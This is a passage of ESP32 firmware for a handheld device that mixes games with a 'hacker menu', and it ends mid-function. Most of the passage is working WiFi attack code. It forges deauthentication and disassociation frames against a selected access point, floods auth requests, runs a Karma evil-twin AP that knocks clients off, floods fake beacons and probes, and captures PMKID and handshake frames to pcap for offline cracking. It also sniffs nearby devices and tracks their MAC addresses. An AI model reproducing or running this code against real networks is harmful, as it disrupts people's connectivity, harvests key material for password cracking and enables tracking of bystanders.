      pressStart[i]=now; lastRepeat[i]=now;
      if (i==3 && (now-lastPress[3]<DOUBLE_WINDOW_G) && lastPress[3]>0) { lastPress[3]=0; return 'E'; }
      lastPress[i]=now;
      if (i==0) return 'U';
      if (i==1) return 'D';
      if (i==2) return 'L';
      if (i==3) return 'R';
    } else if (!nowPressed && pressed[i]) pressed[i]=false;
    else if (nowPressed && pressed[i]) {
      if (now-pressStart[i]<HOLD_DELAY) continue;
      if (now-lastRepeat[i]>REPEAT_INTERVAL) {
        lastRepeat[i]=now;
        if (i==0) return 'U';
        if (i==1) return 'D';
        if (i==2) return 'L';
        if (i==3) return 'R';
      }
    }
  }
  return 0;
}
char getTetrisKey() {
  int pins[4] = {BTN_UP,BTN_DOWN,BTN_LEFT,BTN_RIGHT};
  unsigned long now = millis();
  const unsigned long HOLD_DELAY=250, REPEAT_INTERVAL=100, ROTATE_DEBOUNCE=250, HARDROP_DEBOUNCE=300;
  static bool pressed[4]={false,false,false,false};
  static unsigned long pressStart[4]={0,0,0,0};
  static unsigned long lastRepeat[4]={0,0,0,0};
  static unsigned long lastPress[4]={0,0,0,0};
  static unsigned long lastRotate=0, lastHardDrop=0;
  for (int i=0;i<4;i++) {
    bool nowPressed=(digitalRead(pins[i])==LOW);
    if (nowPressed && !pressed[i]) {
      delay(3);
      if (digitalRead(pins[i])!=LOW) continue;
      pressed[i]=true;
      pressStart[i]=now; lastRepeat[i]=now;
      if (i==3 && (now-lastPress[3]<400) && lastPress[3]>0) { lastPress[3]=0; return 'E'; }
      lastPress[i]=now;
      if (i==0) return 'U';
      if (i==1) return 'D';
      if (i==2) { if (now-lastRotate>ROTATE_DEBOUNCE) { lastRotate=now; return 'L'; } return 0; }
      if (i==3) { if (now-lastHardDrop>HARDROP_DEBOUNCE) { lastHardDrop=now; return 'R'; } return 0; }
    } else if (!nowPressed && pressed[i]) pressed[i]=false;
    else if (nowPressed && pressed[i]) {
      if (i>=2) continue;
      if (now-pressStart[i]<HOLD_DELAY) continue;
      if (now-lastRepeat[i]>REPEAT_INTERVAL) { lastRepeat[i]=now; if (i==0) return 'U'; if (i==1) return 'D'; }
    }
  }
  return 0;
}
char getSnakeKey() {
  static bool prevState[4]={true,true,true,true};
  static unsigned long lastPress[4]={0,0,0,0};
  int pins[4]={BTN_UP,BTN_DOWN,BTN_LEFT,BTN_RIGHT};
  for (int i=0;i<4;i++) {
    bool nowPressed=(digitalRead(pins[i])==LOW);
    if (nowPressed && prevState[i] && (millis()-lastPress[i]>50)) {
      prevState[i]=false; lastPress[i]=millis();
      if (i==0) return 'U';
      if (i==1) return 'D';
      if (i==2) return 'L';
      if (i==3) return 'R';
    } else if (!nowPressed && !prevState[i]) prevState[i]=true;
  }
  return 0;
}
char getKeyEncoder() {
  static unsigned long lastRightPress=0;
  static bool waitingRightDouble=false;
  unsigned long now=millis();
  if (digitalRead(BTN_UP)==LOW) { delay(20); if (digitalRead(BTN_UP)==LOW) { while (digitalRead(BTN_UP)==LOW) delay(5); return 'U'; } }
  if (digitalRead(BTN_DOWN)==LOW) { delay(20); if (digitalRead(BTN_DOWN)==LOW) { while (digitalRead(BTN_DOWN)==LOW) delay(5); return 'D'; } }
  if (digitalRead(BTN_LEFT)==LOW) {
    delay(20);
    if (digitalRead(BTN_LEFT)==LOW) {
      unsigned long start=millis(); bool longPress=false;
      while (digitalRead(BTN_LEFT)==LOW) { delay(5); if (!longPress && millis()-start>700) longPress=true; }
      return longPress ? 'M' : 'L';
    }
  }
  if (digitalRead(BTN_RIGHT)==LOW) {
    delay(20);
    if (digitalRead(BTN_RIGHT)==LOW) {
      while (digitalRead(BTN_RIGHT)==LOW) delay(5);
      if (waitingRightDouble && (now-lastRightPress<400)) { waitingRightDouble=false; return 'E'; }
      waitingRightDouble=true; lastRightPress=now;
    }
  }
  if (waitingRightDouble && (now-lastRightPress>=400)) { waitingRightDouble=false; return 'X'; }
  return 0;
}
void waitExit() { while (true) { char k=getKey(); if (k=='R'||k=='E') return; delay(20); } }

void showWifiScan(); void showIPScan(); void showDeauth(); void showKarma();
void showProbeFlood(); void showBeaconFlood(); void showPMKID(); void showSniffer();
void showKeyEncoder(); void showDeviceTracker(); void showBLEScan(); void showBLESpam();
void showChanGraph(); void showBleGatt(); void showTrackerDetect();
void showTetris(); void showBreakout(); void showSnake(); void showDinoRun();
void showFlappyBird(); void show2048(); void showPlaneWar(); void showMinesweeper(); void showRoguelike();
void showGameMenu(); void showHackerMenu(); void showSettings(); void showAbout();
void showMemory(); void showLog(); void showLogView(); void showLogExport();
void showPetMenu(); void showPetWhale();
void pet2DrawFish(int, int, uint8_t, bool);
void pet2DrawBar(int, const char*, uint8_t, uint16_t);

void logOverwrite(const char* title);
void logAppend(const char* line);

bool askSaveLog() {
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawCentreString("Save Log?", 80, 20, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawCentreString("L:Yes   R:No", 80, 46, 1);
  while (true) {
    char k = getKey();
    if (k == 'L') return true;
    if (k == 'R' || k == 'E') return false;
    delay(20);
  }
}

void initRawWifi() {
  WiFi.mode(WIFI_OFF); delay(100);
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg); esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA); esp_wifi_start();
  esp_wifi_set_max_tx_power(80); wifiInited=true;
}

void showWifiScan() {
  clearAll(); titleBar("Scanning...");
  bool wasConnected=(WiFi.status()==WL_CONNECTED);
  WiFi.mode(WIFI_STA);
  int n=WiFi.scanNetworks();
  if (wasConnected && wifiConfigured) wifiFastBegin();
  if (n<=0) { clearAll(); titleBar("No networks"); waitExit(); return; }
  int sel=0, off=0;
  while (true) {
    clearAll(); titleBar("WiFi Networks");
    int startY=14, visible=4;
    if (sel<off) off=sel;
    if (sel>=off+visible) off=sel-visible+1;
    for (int i=0;i<visible && off+i<n;i++) {
      int idx=off+i;
      String s=WiFi.SSID(idx).substring(0,8)+" "+String(WiFi.RSSI(idx))+" c"+String(WiFi.channel(idx));
      tft.drawString(((idx==sel)?"> ":"  ")+s,2,startY+i*12);
    }
    char k=getKey();
    if (k=='U') { sel--; if (sel<0) sel=n-1; }
    else if (k=='D') { sel++; if (sel>=n) sel=0; }
    else if (k=='R'||k=='E') break;
    delay(20);
  }
}
void showIPScan() {
  if (WiFi.status()!=WL_CONNECTED) { clearAll(); titleBar("No WiFi"); tft.drawString("Connect first",2,20); delay(1500); return; }
  clearAll(); titleBar("Scanning...");
  IPAddress gw=WiFi.gatewayIP(); IPAddress myIP=WiFi.localIP();
  IPAddress foundIPs[20]; int foundCount=0;
  for (int i=1;i<255 && foundCount<20;i++) {
    IPAddress target(gw[0],gw[1],gw[2],i);
    if (target==myIP) continue;
    WiFiClient client;
    if (client.connect(target,80,50)||client.connect(target,443,50)) { foundIPs[foundCount++]=target; client.stop(); }
  }
  if (foundCount==0) { clearAll(); titleBar("No devices"); tft.drawString("GW:"+gw.toString(),2,14); tft.drawString("ME:"+myIP.toString(),2,26); waitExit(); return; }
  int sel=0, off=0;
  while (true) {
    clearAll(); titleBar("IP Devices");
    int startY=14, visible=4;
    if (sel<off) off=sel;
    if (sel>=off+visible) off=sel-visible+1;
    for (int i=0;i<visible && off+i<foundCount;i++) {
      int idx=off+i;
      tft.drawString(((idx==sel)?"> ":"  ")+foundIPs[idx].toString(),2,startY+i*12);
    }
    char k=getKey();
    if (k=='U') { sel--; if (sel<0) sel=foundCount-1; }
    else if (k=='D') { sel++; if (sel>=foundCount) sel=0; }
    else if (k=='R'||k=='E') break;
    delay(20);
  }
}
void sendDeauthTargeted(uint8_t* bssid, uint8_t ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  uint8_t deauth[26]={0xC0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0x07,0x00};
  memcpy(deauth+10,bssid,6); memcpy(deauth+16,bssid,6);
  uint8_t disassoc[26]={0xA0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0x01,0x00};
  memcpy(disassoc+10,bssid,6); memcpy(disassoc+16,bssid,6);
  for (int i=0;i<10;i++) esp_wifi_80211_tx(WIFI_IF_STA,deauth,sizeof(deauth),false);
  for (int i=0;i<10;i++) esp_wifi_80211_tx(WIFI_IF_STA,disassoc,sizeof(disassoc),false);
}
void sendAuthFlood(uint8_t* bssid, uint8_t ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  uint8_t auth[30]={0xB0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0,0};
  memcpy(auth+4,bssid,6); memcpy(auth+10,bssid,6); memcpy(auth+16,bssid,6);
  for (int i=0;i<10;i++) {
    auth[13]=random(256); auth[14]=random(256); auth[15]=random(256);
    esp_wifi_80211_tx(WIFI_IF_STA,auth,sizeof(auth),false);
  }
}
void showDeauth() {
  clearAll(); titleBar("Scanning...");
  WiFi.mode(WIFI_STA);
  int n=WiFi.scanNetworks();
  if (!n) { titleBar("No AP"); delay(1000); return; }
  int sel=0, off=0;
  while (true) {
    clearAll(); titleBar("Select AP");
    int startY=14, visible=4;
    if (sel<off) off=sel;
    if (sel>=off+visible) off=sel-visible+1;
    for (int i=0;i<visible && off+i<n;i++) {
      int idx=off+i;
      tft.drawString(((idx==sel)?"> ":"  ")+WiFi.SSID(idx).substring(0,14),2,startY+i*12);
    }
    char k=getKey();
    if (k=='U') { sel--; if (sel<0) sel=n-1; }
    else if (k=='D') { sel++; if (sel>=n) sel=0; }
    else if (k=='L') break;
    else if (k=='R'||k=='E') return;
    delay(20);
  }
  uint8_t bssid[6]; memcpy(bssid,WiFi.BSSID(sel),6);
  uint8_t ch=WiFi.channel(sel);
  String ssid=WiFi.SSID(sel);
  int mode=0;
  while (true) {
    clearAll(); titleBar("Attack Mode");
    tft.drawString(ssid.substring(0,12),2,14);
    const char* modes[]={"Deauth+Disassoc","Auth Flood","Mixed"};
    for (int i=0;i<3;i++) { String pre=(i==mode)?"> ":"  "; tft.drawString(pre+modes[i],2,30+i*12); }
    char k=getKey();
    if (k=='U') mode=(mode+2)%3;
    else if (k=='D') mode=(mode+1)%3;
    else if (k=='L') break;
    else if (k=='R'||k=='E') return;
    delay(20);
  }
  clearAll(); titleBar("Attack Running");
  tft.drawString(ssid.substring(0,12),2,16);
  tft.drawString(mode==0?"Deauth":(mode==1?"Auth":"Mixed"),2,28);
  initRawWifi();
  int cnt=0;
  while (true) {
    if (mode==0||mode==2) sendDeauthTargeted(bssid,ch);
    if (mode==1||mode==2) sendAuthFlood(bssid,ch);
    cnt++;
    if (cnt%10==0) {
      tft.fillRect(0,48,160,20,TFT_BLACK);
      tft.drawString("Rounds:"+String(cnt),2,48);
      int pkts=(mode==0)?cnt*20:(mode==1?cnt*10:cnt*30);
      tft.drawString("Pkts:"+String(pkts),2,60);
    }
    char k=getKey();
    if (k=='R'||k=='E') break;
    delay(0);
  }
  deinitWifi();
}
void showKarma() {
  clearAll(); titleBar("Karma+");
  tft.drawString("Listening 15s...",2,20);
  deinitWifi();
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  esp_wifi_set_promiscuous(true);
  sniffCount=0; sniffRunning=true;
  unsigned long start=millis(); int lastRefresh=0;
  while (millis()-start<15000) {
    if (millis()-lastRefresh>500) {
      lastRefresh=millis();
      char buf[24]; snprintf(buf,sizeof(buf),"SSIDs: %d",sniffCount);
      tft.fillRect(0,20,160,20,TFT_BLACK);
      tft.drawString(buf,2,20);
      tft.drawString("Sec:"+String((millis()-start)/1000),2,32);
    }
    delay(50);
  }
  sniffRunning=false;
  esp_wifi_set_promiscuous(false);
  if (sniffCount==0) { clearAll(); titleBar("Karma+"); tft.drawString("No SSIDs",2,30); waitExit(); return; }
  int sel=0, off=0;
  while (true) {
    clearAll(); titleBar("Karma: Select");
    int startY=14, visible=4;
    if (sel<off) off=sel;
    if (sel>=off+visible) off=sel-visible+1;
    for (int i=0;i<visible && off+i<sniffCount;i++) {
      int idx=off+i;
      tft.drawString(((idx==sel)?"> ":"  ")+String(sniffList[idx].ssid).substring(0,14),2,startY+i*12);
    }
    char k=getKey();
    if (k=='U') { sel--; if (sel<0) sel=sniffCount-1; }
    else if (k=='D') { sel++; if (sel>=sniffCount) sel=0; }
    else if (k=='L') break;
    else if (k=='R'||k=='E') return;
    delay(20);
  }
  String targetSSID=String(sniffList[sel].ssid);
  clearAll(); titleBar("Karma Active");
  tft.drawString("SSID:",2,20);
  tft.drawString(targetSSID.substring(0,20),2,32);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(targetSSID.c_str(),nullptr);
  tft.drawString("IP:"+WiFi.softAPIP().toString(),2,46);
  tft.drawString("Clients:0",2,60);
  int clients=0; unsigned long lastCount=0, lastDeauth=0;
  while (true) {
    if (millis()-lastCount>1000) {
      lastCount=millis();
      int c=WiFi.softAPgetStationNum();
      if (c!=clients) { clients=c; tft.fillRect(0,60,160,10,TFT_BLACK); tft.drawString("Clients:"+String(clients),2,60); }
    }
    if (clients>0 && millis()-lastDeauth>5000) {
      lastDeauth=millis();
      uint8_t broad[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
      uint8_t deauth[26]={0xC0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0x07,0x00};
      memcpy(deauth+10,broad,6); memcpy(deauth+16,broad,6);
      for (int i=0;i<10;i++) esp_wifi_80211_tx(WIFI_IF_AP,deauth,sizeof(deauth),false);
    }
    char k=getKey();
    if (k=='R'||k=='E') break;
    delay(20);
  }
  WiFi.softAPdisconnect(true);
  deinitWifi();
}
void sendProbe(const char* ssid) {
  uint8_t f[80]={0x40,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0};
  f[10]=random(256); f[11]=random(256); f[12]=random(256);
  f[13]=random(256); f[14]=random(256); f[15]=random(256);
  size_t len=strlen(ssid); if (len>32) len=32;
  f[24]=0x00; f[25]=len; memcpy(&f[26],ssid,len);
  esp_wifi_80211_tx(WIFI_IF_STA,f,26+len,false);
}
void showProbeFlood() {
  clearAll(); titleBar("Probe Flood+");
  tft.drawString("Sending...",2,20);
  initRawWifi();
  const char* fake[]={"FreeWiFi","Home","Guest","TP-LINK","ChinaNet","CMCC","Starbucks","Airport","Hotel","Office","iPhone","AndroidAP"};
  int cnt=0;
  while (true) {
    for (int i=0;i<20;i++) { sendProbe(fake[random(0,12)]); cnt++; }
    if (cnt%1000==0) { tft.fillRect(0,40,160,20,TFT_BLACK); tft.drawString("Pkts:"+String(cnt),2,40); }
    char k=getKey();
    if (k=='R'||k=='E') break;
    delay(0);
  }
  deinitWifi();
}
void sendBeacon(const char* ssid, uint8_t ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  uint8_t b[128]={0x80,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x64,0,0x31,0x04,0,0};
  for (int i=0;i<6;i++) { uint8_t m=random(256); b[10+i]=m; b[16+i]=m; }
  size_t len=strlen(ssid); if (len>32) len=32;
  b[37]=len; memcpy(&b[38],ssid,len);
  esp_wifi_80211_tx(WIFI_IF_AP,b,38+len,false);
}
void showBeaconFlood() {
  clearAll(); titleBar("Beacon Flood+");
  tft.drawString("Sending...",2,20);
  initRawWifi();
  const char* fakeNames[]={"FreeWiFi","CMCC","ChinaNet","Starbucks","Airport_Free","TP-LINK","MERCURY","HUAWEI","Xiaomi","iPhone","AndroidAP","NETGEAR"};
  uint8_t channels[]={1,6,11};
  int chIdx=0; unsigned long lastChSwitch=millis(); int cnt=0;
  while (true) {
    if (millis()-lastChSwitch>1500) { lastChSwitch=millis(); chIdx=(chIdx+1)%3; esp_wifi_set_channel(channels[chIdx],WIFI_SECOND_CHAN_NONE); }
    for (int i=0;i<50;i++) { String s=fakeNames[random(0,12)]; sendBeacon(s.c_str(),channels[chIdx]); cnt++; }
    if (cnt%500==0) { tft.fillRect(0,40,160,20,TFT_BLACK); tft.drawString("B:"+String(cnt),2,40); tft.drawString("ch"+String(channels[chIdx]),2,52); }
    char k=getKey();
    if (k=='R'||k=='E') break;
    delay(0);
  }
  deinitWifi();
}
volatile bool pmkidRunning=false;
volatile uint32_t pmkidPkts=0;
File pmkidFile;
void pmkidCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!pmkidRunning) return;
  wifi_promiscuous_pkt_t* pkt=(wifi_promiscuous_pkt_t*)buf;
  int len=pkt->rx_ctrl.sig_len;
  if (len<24) return;
  uint8_t* p=pkt->payload;
  uint8_t fc=p[0]; uint8_t ftype=(fc>>2)&0x03; uint8_t sub=(fc>>4)&0x0F;
  bool save=false;
  if (ftype==0x00 && (sub==1||sub==3)) save=true;
  if (ftype==0x02) save=true;
  if (save && pmkidFile) { pmkidFile.write(pkt->payload,len); pmkidPkts++; }
}
void showPMKID() {
  clearAll(); titleBar("PMKID+");
  tft.drawString("Scanning...",2,20);
  WiFi.mode(WIFI_STA);
  int n=WiFi.scanNetworks();
  if (!n) { titleBar("No AP"); delay(1000); return; }
  int sel=0, off=0;
  while (true) {
    clearAll(); titleBar("Select AP");
    int startY=14, visible=4;
    if (sel<off) off=sel;
    if (sel>=off+visible) off=sel-visible+1;
    for (int i=0;i<visible && off+i<n;i++) {
      int idx=off+i;
      tft.drawString(((idx==sel)?"> ":"  ")+WiFi.SSID(idx).substring(0,14),2,startY+i*12);
    }
    char k=getKey();
    if (k=='U') { sel--; if (sel<0) sel=n-1; }
    else if (k=='D') { sel++; if (sel>=n) sel=0; }
    else if (k=='L') break;
    else if (k=='R'||k=='E') return;
    delay(20);
  }
  uint8_t bssid[6]; memcpy(bssid,WiFi.BSSID(sel),6);
  uint8_t ch=WiFi.channel(sel);
  String ssid=WiFi.SSID(sel);
  clearAll(); titleBar("PMKID+");
  tft.drawString(ssid.substring(0,12),2,16);
  tft.drawString("Capturing...",2,30);
  ensureLittleFS();
  pmkidFile=LittleFS.open("/pmkid_"+String(millis())+".pcap","w");
  if (pmkidFile) {
    uint8_t hdr[24]={0xD4,0xC3,0xB2,0xA1,0x02,0,0x04,0,0,0,0,0,0,0,0,0,0xFF,0xFF,0,0,0x69,0,0,0};
    pmkidFile.write(hdr,24);
  }
  initRawWifi();
  esp_wifi_set_channel(ch,WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(pmkidCallback);
  esp_wifi_set_promiscuous(true);
  pmkidRunning=true; pmkidPkts=0;
  uint8_t assoc[30]={0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0,0};
  memcpy(assoc+4,bssid,6); memcpy(assoc+10,bssid,6); memcpy(assoc+16,bssid,6);
  uint8_t deauth[26]={0xC0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0x07,0x00};
  memcpy(deauth+10,bssid,6); memcpy(deauth+16,bssid,6);
  unsigned long start=millis(); int round=0;
  while (millis()-start<45000) {
    round++;
    for (int i=0;i<5;i++) esp_wifi_80211_tx(WIFI_IF_STA,assoc,sizeof(assoc),false);
    delay(30);
    for (int i=0;i<5;i++) esp_wifi_80211_tx(WIFI_IF_STA,deauth,sizeof(deauth),false);
    delay(80);
    if (round%10==0) {
      tft.fillRect(0,44,160,20,TFT_BLACK);
      tft.drawString("Pkts:"+String(pmkidPkts),2,44);
      tft.drawString("Sec:"+String((millis()-start)/1000),2,56);
    }
    char k=getKey();
    if (k=='R'||k=='E') break;
  }
  pmkidRunning=false;
  esp_wifi_set_promiscuous(false);
  if (pmkidFile) pmkidFile.close();
  clearAll(); titleBar("PMKID Done");
  tft.drawString("Captured:",2,20);
  tft.drawString(String(pmkidPkts)+" frames",2,32);
  tft.drawString("Saved to LittleFS",2,46);
  deinitWifi();

  if (pmkidPkts > 0 && askSaveLog()) {
    logOverwrite("PMKID Capture");
    char buf[80];
    snprintf(buf, sizeof(buf), "SSID:  %s", ssid.c_str());
    logAppend(buf);
    snprintf(buf, sizeof(buf), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    logAppend(buf);
    snprintf(buf, sizeof(buf), "Ch:    %d", ch);
    logAppend(buf);
    snprintf(buf, sizeof(buf), "Frames:%u", (unsigned)pmkidPkts);
    logAppend(buf);
    clearAll(); titleBar("Log Saved"); delay(800);
  }
  waitExit();
}
void showSniffer() {
  deinitWifi();
  clearAll(); titleBar("Sniffer");
  tft.drawString("Listening...",2,20);
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  esp_wifi_set_promiscuous(true);
  sniffCount=0; sniffRunning=true;
  int sel=0, off=0;
  unsigned long lastRefresh=millis();
  while (true) {
    if (millis()-lastRefresh>500) {
      lastRefresh=millis();
      clearAll();
      char titleBuf[24]; snprintf(titleBuf,sizeof(titleBuf),"Sniff: %d",sniffCount); titleBar(titleBuf);
      int startY=14, visible=4;
      if (sel<off) off=sel;
      if (sel>=off+visible) off=sel-visible+1;
      for (int i=0;i<visible && off+i<sniffCount;i++) {
        int idx=off+i;
        tft.drawString(((idx==sel)?"> ":"  ")+String(sniffList[idx].ssid).substring(0,14),2,startY+i*12);
      }
    }
    char k=getKey();
    if (k=='U') { if (sniffCount>0) { sel--; if (sel<0) sel=sniffCount-1; } }
    else if (k=='D') { if (sniffCount>0) { sel++; if (sel>=sniffCount) sel=0; } }
    else if (k=='R'||k=='E') break;
    delay(20);
  }
  sniffRunning=false;
  esp_wifi_set_promiscuous(false);
  deinitWifi();

  if (sniffCount > 0 && askSaveLog()) {
    logOverwrite("WiFi Sniffer");
    for (int i = 0; i < sniffCount; i++) {
      char buf[80];
      snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X  %s  %d",
        sniffList[i].mac[0], sniffList[i].mac[1], sniffList[i].mac[2],
        sniffList[i].mac[3], sniffList[i].mac[4], sniffList[i].mac[5],
        sniffList[i].ssid, sniffList[i].rssi);
      logAppend(buf);
    }
    clearAll(); titleBar("Log Saved"); delay(800);
  }
}

enum KeyState { KS_EDIT, KS_MODEL_MENU, KS_EXPORTED };
KeyState keyState = KS_EDIT;
int keySelectedTooth=0, keyModelMenuSel=0, keyExportSum=0;
bool keyNeedsRedraw=true;
void drawKeyEditScreen() {
  clearAll();
  tft.setTextColor(TFT_WHITE,TFT_BLACK); tft.drawString("Key Encoder",2,0);
  char mb[16]; snprintf(mb,sizeof(mb),"%s [>]",MODELS[keyModel].name);
  tft.setTextColor(TFT_GREEN,TFT_BLACK); tft.drawString(mb,112,0);
  tft.setTextColor(TFT_WHITE,TFT_BLACK);
  int numTeeth=MODELS[keyModel].teeth; int maxDepth=MODELS[keyModel].maxDepth;
  int totalWidth=numTeeth*24; int offsetX=(160-totalWidth)/2;
  const int BASE_Y=26, BOTTOM_Y=48, DIGIT_Y=14, SCALE=2;
  for (int i=0;i<numTeeth;i++) {
    int xL=offsetX+i*24, xC=xL+12, xR=xL+24;
    int depth=keyTeeth[i]; if (depth>maxDepth) depth=maxDepth;
    int yC=BASE_Y+depth*SCALE;
    uint16_t c=(i==keySelectedTooth)?TFT_YELLOW:TFT_CYAN;
    tft.drawLine(xL,BASE_Y,xC,yC,c); tft.drawLine(xC,yC,xR,BASE_Y,c);
  }
  tft.drawFastHLine(offsetX,BOTTOM_Y,totalWidth,TFT_WHITE);
  for (int i=0;i<numTeeth;i++) {
    int xC=offsetX+i*24+12;
    char b[4]; snprintf(b,sizeof(b),"%d",keyTeeth[i]);
    tft.setTextColor((i==keySelectedTooth)?TFT_YELLOW:TFT_WHITE,TFT_BLACK);
    tft.drawCentreString(b,xC,DIGIT_Y,1);
  }
  tft.setTextColor(TFT_WHITE,TFT_BLACK);
}
void drawKeyModelMenu() {
  clearAll();
  tft.setTextColor(TFT_CYAN,TFT_BLACK); tft.drawCentreString("Select Model",80,4,1);
  for (int i=0;i<MODEL_COUNT;i++) {
    int y=18+i*11;
    String line=String(MODELS[i].name)+"  "+String(MODELS[i].teeth)+"T 0-"+String(MODELS[i].maxDepth);
    tft.setTextColor((i==keyModelMenuSel)?TFT_YELLOW:TFT_WHITE,TFT_BLACK);
    tft.drawString(((i==keyModelMenuSel)?"> ":"  ")+line,4,y);
  }
  tft.setTextColor(TFT_WHITE,TFT_BLACK);
}
void drawKeyExportedScreen() {
  clearAll();
  tft.setTextColor(TFT_GREEN,TFT_BLACK); tft.drawCentreString("EXPORTED",80,6,1);
  tft.setTextColor(TFT_WHITE,TFT_BLACK);
  tft.drawString("Model: "+String(MODELS[keyModel].name),4,22);
  int numTeeth=MODELS[keyModel].teeth;
  String cuts="Cuts :";
  for (int i=0;i<numTeeth;i++) { cuts+=" "; cuts+=String(keyTeeth[i]); }
  tft.drawString(cuts,4,36);
  tft.drawString("Sum  : "+String(keyExportSum),4,50);
  tft.setTextColor(TFT_WHITE,TFT_BLACK);
}
void keyExport() {
  int numTeeth=MODELS[keyModel].teeth;
  int sum=0;
  for (int i=0;i<numTeeth;i++) sum+=keyTeeth[i];
  keyExportSum=sum;
  Serial.println("=== KEY EXPORT ===");
  Serial.print("Model: "); Serial.println(MODELS[keyModel].name);
  Serial.print("Cuts :");
  for (int i=0;i<numTeeth;i++) { Serial.print(" "); Serial.print(keyTeeth[i]); }
  Serial.println(); Serial.print("Sum  : "); Serial.println(sum);
  if (askSaveLog()) {
    logOverwrite("Key Encoder");
    char buf[80];
    snprintf(buf, sizeof(buf), "Model: %s", MODELS[keyModel].name);
    logAppend(buf);
    String cuts = "Cuts :";
    for (int i = 0; i < numTeeth; i++) { cuts += " "; cuts += String(keyTeeth[i]); }
    logAppend(cuts.c_str());
    snprintf(buf, sizeof(buf), "Sum  : %d", sum);
    logAppend(buf);
    clearAll(); titleBar("Log Saved"); delay(800);
  }
}
void showKeyEncoder() {
  deinitWifi(); deinitBLE();
  keyState=KS_EDIT; keySelectedTooth=0; keyNeedsRedraw=true;
  while (true) {
    if (keyNeedsRedraw) {
      if (keyState==KS_EDIT) drawKeyEditScreen();
      else if (keyState==KS_MODEL_MENU) drawKeyModelMenu();
      else if (keyState==KS_EXPORTED) drawKeyExportedScreen();
      keyNeedsRedraw=false;
    }
    char k=getKeyEncoder();
    if (k==0) { delay(20); continue; }
    if (keyState==KS_EDIT) {
      int numTeeth=MODELS[keyModel].teeth;
      int maxDepth=MODELS[keyModel].maxDepth;
      if (k=='U') { if (keyTeeth[keySelectedTooth]<maxDepth) { keyTeeth[keySelectedTooth]++; keySave(); keyNeedsRedraw=true; } }
      else if (k=='D') { if (keyTeeth[keySelectedTooth]>0) { keyTeeth[keySelectedTooth]--; keySave(); keyNeedsRedraw=true; } }
      else if (k=='L') { keySelectedTooth=(keySelectedTooth+1)%numTeeth; keyNeedsRedraw=true; }
      else if (k=='X') { keyExport(); keyState=KS_EXPORTED; keyNeedsRedraw=true; }
      else if (k=='M') { keyState=KS_MODEL_MENU; keyModelMenuSel=keyModel; keyNeedsRedraw=true; }
      else if (k=='E') break;
    } else if (keyState==KS_MODEL_MENU) {
      if (k=='U') { keyModelMenuSel=(keyModelMenuSel+MODEL_COUNT-1)%MODEL_COUNT; keyNeedsRedraw=true; }
      else if (k=='D') { keyModelMenuSel=(keyModelMenuSel+1)%MODEL_COUNT; keyNeedsRedraw=true; }
      else if (k=='L') {
        keyModel=keyModelMenuSel;
        for (int i=0;i<8;i++) keyTeeth[i]=0;
        keySelectedTooth=0; keySave();
        keyState=KS_EDIT; keyNeedsRedraw=true;
      } else if (k=='R'||k=='M'||k=='E') { keyState=KS_EDIT; keyNeedsRedraw=true; }
    } else if (keyState==KS_EXPORTED) { keyState=KS_EDIT; keyNeedsRedraw=true; }
    delay(20);
  }
}

void showDeviceTracker() {
  deinitWifi();
  clearAll(); titleBar("Device Tracker");
  tft.drawString("Scanning...",2,20);
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  esp_wifi_set_promiscuous(true);
  trackCount=0; trackRunning=true;
  int sel=0, off=0;
  unsigned long lastRefresh=millis();
  while (true) {
    if (millis()-lastRefresh>500) {
      lastRefresh=millis();
      clearAll();
      char titleBuf[24]; snprintf(titleBuf,sizeof(titleBuf),"Track: %d",trackCount); titleBar(titleBuf);
      int startY=14, visible=4;
      if (sel<off) off=sel;
      if (sel>=off+visible) off=sel-visible+1;
      for (int i=0;i<visible && off+i<trackCount;i++) {
        int idx=off+i;
        char macBuf[20];
        snprintf(macBuf,sizeof(macBuf),"%02X:%02X:%02X:%02X:%02X:%02X",trackList[idx].mac[0],trackList[idx].mac[1],trackList[idx].mac[2],trackList[idx].mac[3],trackList[idx].mac[4],trackList[idx].mac[5]);
